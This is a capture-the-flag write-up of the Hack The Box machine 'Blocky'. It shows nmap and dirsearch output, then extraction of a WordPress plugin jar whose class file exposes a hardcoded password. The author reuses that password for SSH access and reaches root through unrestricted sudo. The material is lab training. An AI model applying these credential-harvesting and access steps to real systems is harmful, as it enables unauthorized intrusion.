# [Blocky] - [HTB] (https://labs.hackthebox.com/achievement/machine/2147656/48)
**Difficulty:** [Easy]  
**OS:** [Linux]  
**Date:** [05/09/2025]  
**Machine Type:** [OSWE]

---

## 1. Summary
- **Objective:** [ ] Capture user flag  
- **Objective:** [ ] Capture root flag / administrator access  
- **Description / Notes:** [Brief overview of the machine, main services, challenges]  
- **Skills Practiced:** 
  - [X] Enumeration
  - [X] Web Exploitation
  - [X] Exploiting bad password practices
  - [X] Privilege Escalation
---

## 2. Recon & Enumeration

### 2.1 Network Scanning
```bash
# Nmap Quick Scan
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -T4 10.10.10.37 -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 21:59 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:59
Completed NSE at 21:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:59
Completed NSE at 21:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:59
Completed NSE at 21:59, 0.00s elapsed
Initiating Ping Scan at 21:59
Scanning 10.10.10.37 [4 ports]
Completed Ping Scan at 21:59, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:59
Completed Parallel DNS resolution of 1 host. at 21:59, 0.03s elapsed
Initiating SYN Stealth Scan at 21:59
Scanning 10.10.10.37 [1000 ports]
Discovered open port 22/tcp on 10.10.10.37
Discovered open port 80/tcp on 10.10.10.37
Discovered open port 21/tcp on 10.10.10.37
Completed SYN Stealth Scan at 21:59, 13.23s elapsed (1000 total ports)
Initiating Service scan at 21:59
Scanning 3 services on 10.10.10.37
Completed Service scan at 21:59, 6.46s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.37
Retrying OS detection (try #2) against 10.10.10.37
Initiating Traceroute at 21:59
Completed Traceroute at 21:59, 0.22s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:59
Completed Parallel DNS resolution of 2 hosts. at 22:00, 6.54s elapsed
NSE: Script scanning 10.10.10.37.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:00
Completed NSE at 22:00, 7.13s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:00
Completed NSE at 22:00, 1.65s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:00
Completed NSE at 22:00, 0.00s elapsed
Nmap scan report for 10.10.10.37
Host is up, received echo-reply ttl 63 (0.20s latency).
Scanned at 2025-09-04 21:59:29 IST for 41s
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE REASON         VERSION
21/tcp   open   ftp     syn-ack ttl 63 ProFTPD 1.3.5a
22/tcp   open   ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqVh031OUgTdcXsDwffHKL6T9f1GfJ1/x/b/dywX42sDZ5m1Hz46bKmbnWa0YD3LSRkStJDtyNXptzmEp31Fs2DUndVKui3LCcyKXY6FSVWp9ZDBzlW3aY8qa+y339OS3gp3aq277zYDnnA62U7rIltYp91u5VPBKi3DITVaSgzA8mcpHRr30e3cEGaLCxty58U2/lyCnx3I0Lh5rEbipQ1G7Cr6NMgmGtW6LrlJRQiWA1OK2/tDZbLhwtkjB82pjI/0T2gpA/vlZJH0elbMXW40Et6bOs2oK/V2bVozpoRyoQuts8zcRmCViVs8B3p7T1Qh/Z+7Ki91vgicfy4fl
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgEpgEZGGbtm5suOAio9ut2hOQYLN39Uhni8i4E/Wdir1gHxDCLMoNPQXDOnEUO1QQVbioUUMgFRAXYLhilNF8=
|   256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILqVrP5vDD4MdQ2v3ozqDPxG1XXZOp5VPpVsFUROL6Vj
80/tcp   open   http    syn-ack ttl 63 Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://blocky.htb
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
8192/tcp closed sophos  reset ttl 63
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.13 - 4.4 (98%), Linux 3.2 - 4.14 (94%), Linux 3.8 - 3.16 (94%), Linux 3.13 or 4.2 (92%), Linux 2.6.32 - 3.13 (91%), Linux 4.4 (91%), Synology DiskStation Manager 7.1 (Linux 4.4) (91%), Android 8 - 9 (Linux 3.18 - 4.4) (90%), Linux 3.16 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=9/4%OT=21%CT=8192%CU=%PV=Y%DS=2%DC=T%G=N%TM=68B9BE92%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)
SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M577ST11NW7%O2=M577ST11NW7%O3=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST11NW7%O6=M577ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M577NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.003 days (since Thu Sep  4 21:55:24 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8192/tcp)
HOP RTT       ADDRESS
1   204.07 ms 10.10.14.1
2   207.19 ms 10.10.10.37

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:00
Completed NSE at 22:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:00
Completed NSE at 22:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:00
Completed NSE at 22:00, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.89 seconds
           Raw packets sent: 2072 (94.564KB) | Rcvd: 45 (2.600KB)
```
2.2 Add the blocky.htb to /etc/hosts and do the directory enumeration
```bash
# HTTP
┌──(sabeshan㉿kali)-[~]
└─$ dirsearch -u http://blocky.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                
                                                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/sabeshan/reports/http_blocky.htb/_25-09-04_22-06-48.txt

Target: http://blocky.htb/

[22:06:48] Starting:                                                                                                                   
[22:06:59] 403 -  296B  - /.ht_wsr.txt                                      
[22:06:59] 403 -  299B  - /.htaccess.bak1                                   
[22:06:59] 403 -  299B  - /.htaccess.orig
[22:06:59] 403 -  299B  - /.htaccess.save                                   
[22:06:59] 403 -  301B  - /.htaccess.sample
[22:06:59] 403 -  300B  - /.htaccess_extra                                  
[22:06:59] 403 -  297B  - /.htaccess_sc
[22:06:59] 403 -  299B  - /.htaccess_orig
[22:06:59] 403 -  298B  - /.htaccessOLD2
[22:06:59] 403 -  297B  - /.htaccessOLD
[22:06:59] 403 -  297B  - /.htaccessBAK                                     
[22:06:59] 403 -  289B  - /.htm                                             
[22:07:00] 403 -  290B  - /.html
[22:07:00] 403 -  295B  - /.htpasswds                                       
[22:07:00] 403 -  299B  - /.htpasswd_test                                   
[22:07:00] 403 -  296B  - /.httr-oauth                                      
[22:07:02] 403 -  290B  - /.php3                                            
[22:07:02] 403 -  289B  - /.php                                             
[22:07:57] 301 -    0B  - /index.php  ->  http://blocky.htb/                
[22:07:58] 404 -   48KB - /index.php/login/                                 
[22:07:59] 301 -  313B  - /javascript  ->  http://blocky.htb/javascript/    
[22:08:03] 200 -    7KB - /license.txt                                      
[22:08:15] 301 -  313B  - /phpmyadmin  ->  http://blocky.htb/phpmyadmin/    
[22:08:20] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[22:08:21] 200 -    3KB - /phpmyadmin/index.php                             
[22:08:21] 200 -    3KB - /phpmyadmin/                                      
[22:08:21] 301 -  310B  - /plugins  ->  http://blocky.htb/plugins/          
[22:08:21] 200 -  409B  - /plugins/                                         
[22:08:26] 200 -    3KB - /readme.html                                      
[22:08:29] 403 -  298B  - /server-status                                    
[22:08:29] 403 -  299B  - /server-status/                                   
[22:08:50] 301 -  307B  - /wiki  ->  http://blocky.htb/wiki/                
[22:08:51] 200 -  256B  - /wiki/                                            
[22:08:51] 301 -  311B  - /wp-admin  ->  http://blocky.htb/wp-admin/        
[22:08:51] 200 -    1B  - /wp-admin/admin-ajax.php                          
[22:08:51] 302 -    0B  - /wp-admin/  ->  http://blocky.htb/wp-login.php?redirect_to=http%3A%2F%2Fblocky.htb%2Fwp-admin%2F&reauth=1
[22:08:51] 500 -    4KB - /wp-admin/setup-config.php                        
[22:08:51] 200 -    0B  - /wp-config.php
[22:08:52] 200 -  531B  - /wp-admin/install.php                             
[22:08:52] 301 -  313B  - /wp-content  ->  http://blocky.htb/wp-content/    
[22:08:52] 200 -    0B  - /wp-content/                                      
[22:08:52] 500 -    0B  - /wp-content/plugins/hello.php                     
[22:08:52] 200 -   84B  - /wp-content/plugins/akismet/akismet.php
[22:08:52] 500 -    0B  - /wp-includes/rss-functions.php                    
[22:08:52] 301 -  314B  - /wp-includes  ->  http://blocky.htb/wp-includes/  
[22:08:52] 200 -    0B  - /wp-cron.php
[22:08:53] 302 -    0B  - /wp-signup.php  ->  http://blocky.htb/wp-login.php?action=register
[22:08:53] 200 -  453B  - /wp-content/uploads/                              
[22:08:54] 200 -    1KB - /wp-login.php                                     
[22:08:55] 405 -   42B  - /xmlrpc.php                                       
[22:09:15] 200 -    4KB - /wp-includes/                                      

Task Completed
```
-----------------------------------------------------------------------------------------------------------------------------------------------
2.2 Web Enumeration - The web site was created as wordpress website. There is folder called plugin that has some jar files into this , then exactracted
the content of it.
```bash
┌──(sabeshan㉿kali)-[~/HTB/OSCP]
└─$ cd blocky     
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky]
└─$ ls -la
total 536
drwxrwxr-x 2 sabeshan sabeshan   4096 Sep  5 14:31 .
drwxrwxr-x 5 sabeshan sabeshan   4096 Sep  5 14:31 ..
-rw-rw-r-- 1 sabeshan sabeshan    883 Sep  5 14:27 BlockyCore.jar
-rw-rw-r-- 1 sabeshan sabeshan 532928 Sep  5 14:27 griefprevention-1.11.2-3.1.1.298.jar
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky]
└─$ jar xf BlockyCore.jar 
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky]
└─$ ls -la
total 544
drwxrwxr-x 4 sabeshan sabeshan   4096 Sep  5 14:31 .
drwxrwxr-x 5 sabeshan sabeshan   4096 Sep  5 14:31 ..
-rw-rw-r-- 1 sabeshan sabeshan    883 Sep  5 14:27 BlockyCore.jar
drwxrwxr-x 3 sabeshan sabeshan   4096 Sep  5 14:31 com
-rw-rw-r-- 1 sabeshan sabeshan 532928 Sep  5 14:27 griefprevention-1.11.2-3.1.1.298.jar
drwxrwxr-x 2 sabeshan sabeshan   4096 Sep  5 14:31 META-INF
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky]
└─$ cd com           
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky/com]
└─$ ls -la
total 12
drwxrwxr-x 3 sabeshan sabeshan 4096 Sep  5 14:31 .
drwxrwxr-x 4 sabeshan sabeshan 4096 Sep  5 14:31 ..
drwxrwxr-x 2 sabeshan sabeshan 4096 Sep  5 14:31 myfirstplugin
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~/HTB/OSCP/blocky/com]
└─$ cd myfirstplugin              
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~/…/OSCP/blocky/com/myfirstplugin]
└─$ ls -la
total 12
drwxrwxr-x 2 sabeshan sabeshan 4096 Sep  5 14:31 .
drwxrwxr-x 3 sabeshan sabeshan 4096 Sep  5 14:31 ..
-rw-rw-r-- 1 sabeshan sabeshan  939 Jul  2  2017 BlockyCore.class
                                                                                                                                                             
┌──(sabeshan㉿kali)-[~/…/OSCP/blocky/com/myfirstplugin]
└─$ cat BlockyCore.class 
����4-com/myfirstplugin/BlockyCorejava/lang/ObjectsqlHostLjava/lang/String;sqlUsersqlPass<init>()VCode


        localhost
                       root
                               8YsqfCTnvxAUeduzjNSXe22
onServerStart                                          LineNumberTableLocalVariableTablethisLcom/myfirstplugin/BlockyCore;
             onServerStop
                         onPlayerJoi"TODO get usernam$!Welcome to the BlockyCraft!!!!!!!
&
 '(
   sendMessage'(Ljava/lang/String;Ljava/lang/String;)usernamemessage
SourceFileBlockyCore.java!

Q*�
   *�*�*�▒�▒



▒



▒


7       *!#�%�▒
 
        (
         ?�▒)*+,                                                                                                                                                             
```
notch:8YsqfCTnvxAUeduzjNSXe22 here some creds was obatained i tried these creds for ssh login
The user is notch
--------------------------------------------------------------------------------------------------------------------------
I got the ssh connection for the user and tried this to escalate to the root.
```bash
┌──(sabeshan㉿kali)-[~/…/OSCP/blocky/com/myfirstplugin]
└─$ ssh notch@blocky.htb        
The authenticity of host 'blocky.htb (10.10.10.37)' can't be established.
ED25519 key fingerprint is SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'blocky.htb' (ED25519) to the list of known hosts.
notch@blocky.htb's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$ 
```
----------------------------------------------------------------------------------------------------------------------------

Now I can try 'sudo -l' this allows all and i can escalate the root easily.
```bash

notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo -i
root@Blocky:~# 
```
-------------------------------------------------------------------------------------------------------------------------------
The machine was rooted.



